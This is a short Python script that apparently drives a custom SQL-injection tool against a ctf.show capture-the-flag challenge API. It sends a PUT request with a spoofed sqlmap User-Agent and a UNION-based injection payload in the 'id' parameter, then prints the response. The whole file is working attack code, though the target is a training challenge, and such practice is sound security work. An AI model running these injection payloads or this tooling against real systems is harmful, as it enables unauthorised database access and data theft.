import sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from autosqli.core.models import TargetSpec
from autosqli.core.session import HttpSession
spec = TargetSpec(url="https://b2aa2acb-7351-4497-8aea-b3316f074f1f.challenge.ctf.show/api/index.php",
                  method="PUT", body_params={"id": "1"}, param="id",
                  headers={"Content-Type": "text/plain",
                           "User-Agent": "sqlmap/1.5.12#stable (http://sqlmap.org)",
                           "Referer": "https://ctf.show/"})
s = HttpSession(spec, logger=lambda l, m: print(l, m))
r = s.request_value("1' union select 9137,9150,9163#")
print(r.status_code, r.body[:250])
